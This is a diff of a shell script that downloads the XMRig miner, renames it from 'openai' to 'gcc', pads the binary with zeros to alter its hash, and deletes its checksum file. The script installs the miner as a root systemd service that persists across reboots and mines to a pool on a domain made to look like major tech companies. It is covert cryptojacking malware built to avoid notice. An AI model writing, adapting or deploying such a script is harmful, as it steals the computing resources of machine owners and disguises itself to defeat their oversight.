@@ -4,23 +4,23 @@ U=$1
 latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
 wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
 tar -zxvf 1.tar.gz
-mv xmrig-$latest openai
-mv openai/xmrig openai/openai
-mv openai /etc/openai
+mv xmrig-$latest gcc
+mv gcc/xmrig gcc/gcc
+mv gcc /etc/gcc
 rm -rf 1.tar.gz
-cd /etc/openai && rm -rf SHA256SUMS
-random_number=$((RANDOM % 1088 + 18))
+cd /etc/gcc && rm -rf SHA256SUMS
+random_number=$((RANDOM % 2088 + 208))
 for i in $(seq 1 $random_number); do
-  echo -n "0" >> /etc/openai/openai
+  echo -n "0" >> /etc/gcc/gcc
 done
-cat > /etc/systemd/system/openai.service <<EOL
+cat > /etc/systemd/system/gcc.service <<EOL
 [Unit]
-Description=OpenAI Service
+Description=gcc Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/etc/openai/openai -a rx -o stratum+ssl://rxnat.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
+ExecStart=/etc/gcc/gcc -a rx -o stratum+ssl://rxnat.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
 Restart=on-failure
 User=root
 
@@ -29,8 +29,8 @@ WantedBy=multi-user.target
 EOL
 
 systemctl daemon-reload
-systemctl enable openai.service
-systemctl start openai.service
+systemctl enable gcc.service
+systemctl start gcc.service
 sleep 2
-systemctl status openai.service
-#/etc/openai/openai -a rx -o stratum+ssl://rxnat.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
+systemctl status gcc.service
+#/etc/gcc/gcc -a rx -o stratum+ssl://rxnat.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
